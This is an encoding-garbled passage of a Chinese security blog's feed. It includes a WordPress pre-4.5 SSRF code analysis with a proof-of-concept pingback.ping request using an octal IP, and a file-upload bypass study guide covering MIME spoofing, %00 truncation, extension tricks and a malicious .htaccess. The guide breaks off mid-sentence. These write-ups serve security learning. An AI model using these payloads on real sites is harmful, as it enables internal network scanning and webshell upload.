href="https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/" target="_blank" rel="noopener">https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/</a><br><a href="http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/" target="_blank" rel="noopener">http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ä¸€ï¼šæ¦‚è¿°&quot;&gt;&lt;a href=&quot;#ä¸€ï¼šæ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ï¼šæ¦‚è¿°&quot;&gt;&lt;/a&gt;ä¸€ï¼šæ¦‚è¿°&lt;/h1&gt;&lt;p&gt;drozeræ˜¯ä¸€æ¬¾é’ˆå¯¹Androidç³»ç»Ÿçš„å®‰å…¨æµ‹è¯•æ¡†æ¶ã€‚drozerå¯ä»¥å¸®åŠ©Android appå’Œè®¾å¤‡å˜å¾—æ›´å®‰å…¨ï¼Œå…¶æä¾›äº†å¾ˆå¤šAndroidå¹³å°ä¸‹çš„æ¸—é€æµ‹è¯•exploitä¾›ä½ ä½¿ç”¨å’Œåˆ†äº«ã€‚å¯¹äºè¿œç¨‹çš„exploitï¼Œå®ƒå¯ä»¥ç”Ÿæˆshellcodeå¸®åŠ©ä½ è¿›è¡Œè¿œç¨‹è®¾å¤‡ç®¡ç†ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ›´å¿«çš„Androidå®‰å…¨è¯„ä¼°&lt;br&gt;drozerå¯ä»¥å¤§å¤§ç¼©å‡Androidå®‰å…¨è¯„ä¼°çš„è€—æ—¶ï¼Œé€šè¿‡æ”»å‡»æµ‹è¯•æš´éœ²Android APPçš„æ¼æ´ã€‚&lt;/li&gt;
&lt;li&gt;åŸºäºçœŸæœºçš„æµ‹è¯•&lt;br&gt;drozerè¿è¡Œåœ¨Androidæ¨¡æ‹Ÿå™¨å’ŒçœŸå®è®¾å¤‡ä¸Šï¼Œå®ƒåªéœ€è¦USBè°ƒè¯•å³å¯ä½¿ç”¨ã€‚&lt;/li&gt;
&lt;li&gt;è‡ªåŠ¨åŒ–å’Œæ‰©å±•&lt;br&gt;drozeræœ‰å¾ˆå¤šæ‰©å±•æ¨¡å—ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä»–ä»¬è¿›è¡Œæµ‹è¯•ä»¥å‘ç°Androidå®‰å…¨é—®é¢˜ã€‚
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="mobile" scheme="http://blog.0kami.cn/tags/mobile/"/>
    
  </entry>
  
  <entry>
    <title>ã€Code Analysisã€‘wordpress SSRF &lt;4.5</title>
    <link href="http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/"/>
    <id>http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/</id>
    <published>2016-08-19T07:05:19.000Z</published>
    <updated>2018-01-25T07:32:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>å‰å‡ å¤©ï¼Œwordpressçˆ†å‡ºä¸€ä¸ªSSRFçš„æ¼æ´ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼ŒæŸ¥é˜…äº†ä¸€ä¸‹ï¼Œç½‘ä¸Šå¹¶æ²¡æœ‰è¯¦ç»†çš„åˆ©ç”¨æ–¹å¼ã€‚ä»¥å‰ä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦è¿‡wordpressï¼Œçœ‹äº†ä¸€ä¸‹å—å½±å“çš„ä»£ç ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ã€‚<br><a id="more"></a></p><h3 id="ipåœ°å€çš„å‡ ç§è¡¨ç¤ºæ–¹å¼"><a href="#ipåœ°å€çš„å‡ ç§è¡¨ç¤ºæ–¹å¼" class="headerlink" title="ipåœ°å€çš„å‡ ç§è¡¨ç¤ºæ–¹å¼"></a>ipåœ°å€çš„å‡ ç§è¡¨ç¤ºæ–¹å¼</h3><p>ipåœ°å€åŸŸåæœ‰å¤šç§è¡¨ç¤ºæ–¹å¼ï¼Œæµè§ˆå™¨éƒ½èƒ½è¯†åˆ«å‡ºæ¥ã€‚</p><h6 id="å¸¸è§çš„ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³•"><a href="#å¸¸è§çš„ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³•" class="headerlink" title="å¸¸è§çš„ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³•"></a>å¸¸è§çš„ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³•</h6><ul><li>ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•ï¼Œä¾‹å¦‚192.168.1.2</li><li>äºŒè¿›åˆ¶è¡¨ç¤ºæ³•ä¾‹å¦‚11000000101010000000000100000010ï¼Œè¡¨ç¤º192.168.1.2</li></ul><h6 id="éå¸¸è§ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³•"><a href="#éå¸¸è§ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³•" class="headerlink" title="éå¸¸è§ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³•"></a>éå¸¸è§ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³•</h6><ul><li>æ•´æ•°å‹ï¼šå°†ä¸Šè¿°çš„äºŒè¿›åˆ¶ç›´æ¥è½¬æ¢æˆæ•´æ•°3232235778ï¼Œæµè§ˆå™¨é€šè¿‡è®¿é—®<a href="http://3232235778" target="_blank" rel="noopener">http://3232235778</a> è§£æä¸º192.168.1.2ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥é€šè¿‡å…¬å¼<code>192*256^3+168*256^2+1*256+2=3232235778</code>æ¢ç®—</li><li>å…«è¿›åˆ¶å‹ï¼šå°†IP 192.168.1.2æ¢æˆ8è¿›åˆ¶0300.0250.01.02ï¼Œåœ¨å‰é¢åŠ ä¸Š0è¡¨ç¤º8è¿›åˆ¶</li><li>åå…­è¿›åˆ¶å‹ï¼šå°†IP 192.168.1.2æ¢æˆ16è¿›åˆ¶0xc0.0xA8.1.2ï¼Œåœ¨å‰é¢åŠ ä¸Š0xè¡¨ç¤º16è¿›åˆ¶</li><li>æ··åˆå‹ï¼šå³ä»¥ä¸Šçš„å‡ ç§æ–¹å¼çš„ç»“åˆï¼Œ0300.0xA8.1.0x02</li></ul><p>ä¸‹é¢å°±æ˜¯é€šè¿‡å…«è¿›åˆ¶ç»•è¿‡æ£€æµ‹ã€‚</p><h3 id="ä»£ç è¯¦æƒ…"><a href="#ä»£ç è¯¦æƒ…" class="headerlink" title="ä»£ç è¯¦æƒ…"></a>ä»£ç è¯¦æƒ…</h3><p>æ¼æ´æˆå› å¤„508 <code>wp_http_validate_url</code> å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( ! $same_host ) &#123;</span><br><span class="line">$host = trim( $parsed_url[<span class="string">'host'</span>], <span class="string">'.'</span> );</span><br><span class="line"><span class="keyword">if</span> ( preg_match( <span class="string">'#^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$#'</span>, $host ) ) &#123;</span><br><span class="line">$ip = $host;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$ip = gethostbyname( $host );</span><br><span class="line"><span class="keyword">if</span> ( $ip === $host ) <span class="comment">// Error condition for gethostbyname()</span></span><br><span class="line">$ip = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $ip ) &#123;</span><br><span class="line">$parts = array_map( <span class="string">'intval'</span>, explode( <span class="string">'.'</span>, $ip ) );</span><br><span class="line"><span class="keyword">if</span> ( <span class="number">127</span> === $parts[<span class="number">0</span>] || <span class="number">10</span> === $parts[<span class="number">0</span>] || <span class="number">0</span> === $parts[<span class="number">0</span>]</span><br><span class="line">|| ( <span class="number">172</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">16</span> &lt;= $parts[<span class="number">1</span>] &amp;&amp; <span class="number">31</span> &gt;= $parts[<span class="number">1</span>] )</span><br><span class="line">|| ( <span class="number">192</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">168</span> === $parts[<span class="number">1</span>] )</span><br><span class="line">) &#123;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œçš„ä»£ç é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼<code>^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$</code>åˆ¤æ–­ipæ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•åˆ™é€šè¿‡ç½‘ç»œè·å–ipçš„å€¼ã€‚<br>ä¸‹é¢çš„ifåˆ¤æ–­åˆ™æ˜¯ç”¨æ¥é˜²æ­¢ç»™çš„urlä¸ºå†…ç½‘ipï¼Œä½†æ˜¯ä¸Šè¿°çš„æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥é€šè¿‡8è¿›åˆ¶ç»•è¿‡å†…ç½‘é™åˆ¶ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $parsed_url[<span class="string">'port'</span>] ) )</span><br><span class="line"><span class="keyword">return</span> $url;</span><br><span class="line"></span><br><span class="line">$port = $parsed_url[<span class="string">'port'</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="number">80</span> === $port || <span class="number">443</span> === $port || <span class="number">8080</span> === $port )</span><br><span class="line"><span class="keyword">return</span> $url;</span><br></pre></td></tr></table></figure></p><p>å†æ¥ä¸‹æ¥å¯ä»¥çœ‹åˆ°ç¨‹åºåˆå¯¹ç«¯å£åšäº†é™åˆ¶ï¼Œåªèƒ½æ‰«æ80,443,8080ç«¯å£ã€‚<br>ç»¼ä¸Šæ‰€è¿°ï¼Œé€šè¿‡8è¿›åˆ¶ç»•è¿‡ipåˆ¤æ–­ï¼Œå¯ä»¥æ‰«æå†…ç½‘çš„80,443,8080<br>æ‰¾ä¸€ä¸‹è°ƒç”¨çš„ä½ç½®,å¯ä»¥æ‰¾åˆ°class-wp-xmlrpc-server.phpé€šè¿‡wp_safe_remote_getè°ƒç”¨äº†getå‡½æ•°ï¼Œgetå‡½æ•°ä½¿ç”¨äº†wp_http_validate_urlï¼Œä»è€Œé€ æˆssrf</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>åˆ©ç”¨çš„æ–¹å¼ä¸ºé€šè¿‡xmlrpc.phpä¸­pingback.pingåŠŸèƒ½æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚<br>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 321</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œè®¾ç½®10.10.10.111ä¸ºå—å®³è€…<br><img src="http://blog.0kami.cn/img/wordpress_ssrf_4_4_2/wordpress-ssrf.png" alt="image"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>åœ¨æµ‹è¯•ä¸­å‘ç°åªèƒ½å¯¹10.x.x.xçš„å†…ç½‘ipè¿›è¡Œåˆ©ç”¨ï¼Œå› ä¸ºæ­£åˆ™çš„åŸå› è‡³å¤šåªèƒ½æœ‰3ä½æ•°å­—ï¼Œä¸€ä½éœ€è¦ä¸º0æ¥è¡¨ç¤º8è¿›åˆ¶ï¼Œæ‰€ä»¥åˆ©ç”¨åªæœ‰10,å¹¶ä¸”åªèƒ½æ‰«æ80,443,8080ç«¯å£ã€‚ç”±äºåˆ©ç”¨ä¸­ä¸å›æ˜¾ï¼Œä¹Ÿå¾ˆéš¾ç¡®å®šæ˜¯å¦æˆåŠŸåˆ©ç”¨ã€‚æ‰€ä»¥è¿™ä¸ªæ´å¯èƒ½å±å®³æ¯”è¾ƒå°ï¼ˆå¤ªèœäº†ï¼Œæƒ³ä¸åˆ°å…¶ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œæœ‰å…¶ä»–çš„åˆ©ç”¨æ–¹å¼è®°å¾—åˆ†äº«å•Šï¼ï¼ï¼ï¼‰<br>è¿˜æœ‰ä¸€ç§åˆ©ç”¨å°±æ˜¯å¼€å¯xmlrpcçš„wordpressç«™å¯ä»¥è¢«é€šè¿‡pingback.pingæ–¹æ³•æ¥DDOSï¼Œè¿™ä¸ªä»¥å‰å°±æœ‰äººæå‡ºæ¥äº†ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://xlab.baidu.com/wordpress/" target="_blank" rel="noopener">http://xlab.baidu.com/wordpress/</a><br><a href="https://virusdefender.net/index.php/archives/733/" target="_blank" rel="noopener">https://virusdefender.net/index.php/archives/733/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h3&gt;&lt;p&gt;å‰å‡ å¤©ï¼Œwordpressçˆ†å‡ºä¸€ä¸ªSSRFçš„æ¼æ´ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼ŒæŸ¥é˜…äº†ä¸€ä¸‹ï¼Œç½‘ä¸Šå¹¶æ²¡æœ‰è¯¦ç»†çš„åˆ©ç”¨æ–¹å¼ã€‚ä»¥å‰ä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦è¿‡wordpressï¼Œçœ‹äº†ä¸€ä¸‹å—å½±å“çš„ä»£ç ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ã€‚&lt;br&gt;
    
    </summary>
    
      <category term="codereview" scheme="http://blog.0kami.cn/categories/codereview/"/>
    
    
      <category term="cms" scheme="http://blog.0kami.cn/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>ã€VULNERABLITYã€‘æ–‡ä»¶ä¸Šä¼ å­¦ä¹ æ€»ç»“</title>
    <link href="http://blog.0kami.cn/2016/07/04/old-file-upload/"/>
    <id>http://blog.0kami.cn/2016/07/04/old-file-upload/</id>
    <published>2016-07-04T01:43:32.000Z</published>
    <updated>2018-01-25T07:20:16.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>è¿™å‡ å¤©ç©ºä¸‹æ¥æ ¹æ®<a href="http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf" target="_blank" rel="noopener">ä¸Šä¼ æ”»å‡»æ¡†æ¶</a>å­¦ä¹ æ€»ç»“ä¸€ä¸‹ä¸Šä¼ æ”»å‡»ã€‚<br><a id="more"></a></p><h3 id="ä¸Šä¼ æ£€æµ‹æµç¨‹"><a href="#ä¸Šä¼ æ£€æµ‹æµç¨‹" class="headerlink" title="ä¸Šä¼ æ£€æµ‹æµç¨‹"></a>ä¸Šä¼ æ£€æµ‹æµç¨‹</h3><ol><li>å®¢æˆ·ç«¯javascriptæ£€æµ‹ï¼ˆæ£€æµ‹æ–‡ä»¶æ‰©å±•åä¸ºä¸»ï¼‰</li><li>æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹ï¼ˆæ£€æµ‹Content-typeå†…å®¹ï¼‰</li><li>æœåŠ¡ç«¯ç›®å½•è·¯åŠ²æ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿpathç›¸å…³çš„å†…å®¹ï¼‰</li><li>æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿæ–‡ä»¶åç¼€ç›¸å…³çš„å†…å®¹ï¼‰</li><li>æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹ï¼ˆæ£€æµ‹å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç ï¼‰</li></ol><h3 id="å®¢æˆ·ç«¯javascriptæ£€æµ‹"><a href="#å®¢æˆ·ç«¯javascriptæ£€æµ‹" class="headerlink" title="å®¢æˆ·ç«¯javascriptæ£€æµ‹"></a>å®¢æˆ·ç«¯javascriptæ£€æµ‹</h3><p>é€šå¸¸æ­¤ç±»æ£€æµ‹ä¼šåœ¨jsæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªæ£€æµ‹çš„å‡½æ•°ï¼Œä¸€èˆ¬å¯¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€ååšæ£€æµ‹ï¼Œä¾‹å¦‚ä»…å…è®¸ä¸Šä¼ png,jpg,gifç­‰ç±»å‹çš„æ–‡ä»¶ï¼Œå¦‚æœæ£€æµ‹åˆ°çš„æ–‡ä»¶åç¼€åä¸æ˜¯åœ¨è¿™äº›åå•å†…ï¼Œåˆ™ä¸å‘æœåŠ¡å™¨ç«¯ä¼ è¾“æ–‡ä»¶å†…å®¹ã€‚<br>è¿™ç±»æ£€æµ‹ä¹Ÿæ˜¯æœ€å®¹æ˜“ç»•è¿‡çš„æ£€æµ‹ï¼Œå¯ä»¥ä½¿ç”¨firebugä¹‹ç±»çš„æ’ä»¶æŠŠå®ƒç¦æ‰æˆ–è€…é€šè¿‡burpä¹‹ç±»çš„ä»£ç†å·¥å…·è¿›è¡Œç»•è¿‡æäº¤ã€‚<br>ä½¿ç”¨burpï¼Œä¸Šä¼ æ—¶æä¾›ä¸€ä¸ªç™½åå•å†…çš„åç¼€ï¼Œé€šè¿‡burpæ‹¦åŒ…ï¼Œå¹¶ä¿®æ”¹åç¼€åæäº¤</p><h3 id="æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆMIMEç±»å‹æ£€æµ‹ï¼‰"><a href="#æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆMIMEç±»å‹æ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆMIMEç±»å‹æ£€æµ‹ï¼‰"></a>æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆMIMEç±»å‹æ£€æµ‹ï¼‰</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>) &#123; <span class="comment">//æ£€æµ‹Content-type</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], $uploadfile))   &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸ºphpåç«¯æ£€æµ‹MIMEç±»å‹çš„ä¸€ä¸ªä¾‹å­<br>é€šè¿‡åˆ¤æ–­<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;</code>æ¥ä¿è¯ä¸Šä¼ çš„ç±»å‹ä¸ºgifç±»å‹çš„æ–‡ä»¶ã€‚<br>ç»•è¿‡è¿™ä¸€ç±»å‹çš„æ£€æµ‹ï¼Œå¯ä»¥é€šè¿‡burpæ‹¦åŒ…ï¼Œå°†åŸ<code>Content-Type</code>ç±»å‹è¯¥ä¸ºç¬¦åˆè¦æ±‚çš„<code>image/gif</code>ç±»å‹ã€‚</p><h3 id="æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆç›®å½•è·¯åŠ²æ£€æµ‹ï¼‰"><a href="#æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆç›®å½•è·¯åŠ²æ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆç›®å½•è·¯åŠ²æ£€æµ‹ï¼‰"></a>æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆç›®å½•è·¯åŠ²æ£€æµ‹ï¼‰</h3><p>æœ‰ä¸€äº›webåº”ç”¨ç¨‹åºæœ‰å¤šä¸ªæ–‡ä»¶å¤¹ç”¨æ¥å­˜å‚¨å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ºäº†æ ‡è¯†ä¸Šä¼ çš„å›¾ç‰‡æ˜¯å±äºå“ªä¸ªæ–‡ä»¶å¤¹çš„ï¼Œä¸Šä¼ æ–‡ä»¶æ—¶ä¼šå¸¦ä¸Šæ–‡ä»¶å­˜å‚¨è·¯åŠ²ã€‚è€Œæ­¤æ—¶å¦‚æœå¯¹æ–‡ä»¶ç›®å½•è·¯åŠ²æ£€æµ‹ä¸å¤Ÿå®Œå…¨ï¼Œå¯ä»¥é€šè¿‡æˆªæ–­æ”»å‡»ã€‚ï¼ˆå¦‚%00,windowsä¸‹%80-%90ï¼‰<br>å¦‚ä¸Šä¼ æ—¶æä¾›å­˜å‚¨è·¯åŠ²ä¸º<code>image/20160704/</code>å¯ä»¥é€šè¿‡ä¿®æ”¹ä¸º<code>image/20160704/evil.php%00</code>æ¥è¾¾åˆ°æˆªæ–­ç›®çš„ã€‚åç«¯ç¨‹åºä¼šå°†è¯¥è·¯åŠ²è¿æ¥ä¸º<code>image/20160704/evil.php%00filename.gif</code>00æˆªæ–­å¯¼è‡´æœ€ç»ˆå­˜å‚¨çš„æ–‡ä»¶åä¸ºevil.php</p><h3 id="æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰"><a href="#æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰"></a>æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰</h3><ol><li>é»‘åå•æ£€æµ‹<br>é»‘åå•æ£€æµ‹é€šå¸¸ä¼šæœ‰ä¸€ä¸ªæ–‡ä»¶åç¼€åé»‘åå•ï¼ˆä¾‹å¦‚html|htm|php|php2|php3|php4|php5â€¦ï¼‰<br>ä½†æ˜¯é€šå¸¸é»‘åå•æ£€æµ‹ä¸èƒ½åŒ…å«æ‰€æœ‰çš„æ¶æ„è„šæœ¬åç¼€ï¼Œé˜²æŠ¤éš¾åº¦ä¼šæ¯”è¾ƒå¤§ï¼Œæ¨èä½¿ç”¨ç™½åå•<br>ç»•è¿‡çš„æ–¹æ³•ï¼š</li></ol><ul><li>æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼ˆä¾‹å¦‚ç”¨Phpï¼ŒAspç­‰ï¼‰</li><li>åå•åˆ—è¡¨ç»•è¿‡(ç”¨é»‘åå•ä¸­æœªæåŠçš„æ–‡ä»¶åç¼€æ¥ç»•è¿‡ï¼Œå¦‚asaï¼Œcerç­‰ä¸å¸¸è§çš„æ–‡ä»¶åç¼€)</li><li>0x00æˆªæ–­ï¼ˆaspä¸‹å¯ä»¥å°è¯•ä½¿ç”¨,aspä¸ºä»åå¾€å‰æ‰«ææ‰©å±•åï¼Œ<code>evil.asp%00.jpg</code>ï¼Œä¼šè¢«è¯†åˆ«ä¸ºjpgï¼Œåªè¦æ£€æµ‹æ–¹å¼å¦‚è¿™ç§å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ï¼‰</li><li>ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼ˆåªé€‚ç”¨windowsï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºevil.php.æˆ–evil.php (æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼),åœ¨windowsä¸‹ï¼Œä¸å…è®¸è¿™æ ·çš„å‘½åï¼Œæ‰€ä»¥ä¼šå°†.å’Œç©ºæ ¼è‡ªåŠ¨å»æ‰ï¼‰</li><li>.htaccessæ–‡ä»¶æ”»å‡»ï¼ˆé…åˆåå•åˆ—è¡¨ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„.htaccessï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡å„ç§æ£€æµ‹ï¼‰</li></ul><h5 id="htaccessæ–‡ä»¶æ”»å‡»"><a href="#htaccessæ–‡ä»¶æ”»å‡»" class="headerlink" title=".htaccessæ–‡ä»¶æ”»å‡»"></a>.htaccessæ–‡ä»¶æ”»å‡»</h5><p>å¦‚æœé»‘åå•ä¸­æœªåŒ…å«.htaccessåç¼€çš„å¯ä»¥é€šè¿‡é‡å†™è§£æé…ç½®æ¥è¾¾åˆ°è§£æçš„æ•ˆæœ<br>é’ˆå¯¹phpï¼Œä¸Šä¼ è‡ªå®šä¹‰.htaccess<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;haha&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p><p>åŒç›®å½•æœ‰ä¸ªæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªåªæœ‰æ–‡ä»¶åå¹¶åŒ…å«å­—ç¬¦ä¸²â€hahaâ€ï¼Œä½†æ˜¯å´æ— ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶<br>é‡Œé¢çš„å†…å®¹æ˜¯ php 